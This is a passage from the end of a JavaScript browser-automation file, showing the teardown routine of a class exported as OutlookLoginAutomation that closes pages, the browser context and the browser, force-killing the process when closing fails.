                                    }
                                }
                            }
                        }
                    } catch (pagesError) {
                        if (!pagesError.message.includes('Target.closeTarget')) {
                            console.error('Error closing additional pages:', pagesError.message);
                        }
                    }

                    if (this.context) {
                        try {
                            await this.context.close();
                            console.log('Private browser context closed');
                        } catch (contextError) {
                            if (!contextError.message.includes('Target.closeTarget')) {
                                console.error('Error closing browser context:', contextError.message);
                            }
                        }
                    }

                    try {
                        await this.browser.close();
                        console.log('Browser closed successfully');
                    } catch (browserCloseError) {
                        if (!browserCloseError.message.includes('Target.closeTarget')) {
                            console.error('Error closing browser:', browserCloseError.message);
                        }
                    }
                } else {
                    console.log('Browser connection already closed');
                }
            } catch (error) {
                console.error('Error closing browser:', error.message);
                if (error.message.includes('Connection closed') || error.message.includes('Session closed')) {
                    console.log('Browser session already terminated');
                } else {
                    try {
                        const process = this.browser.process();
                        if (process && !process.killed) {
                            process.kill('SIGKILL');
                            console.log('Browser process force-killed');
                        }
                    } catch (killError) {
                        console.error('Error force-killing browser process:', killError.message);
                    }
                }
            }
        }

        this.browser = null;
        this.page = null;
        this.context = null;
        this.isClosing = false;
    }
}

module.exports = { OutlookLoginAutomation };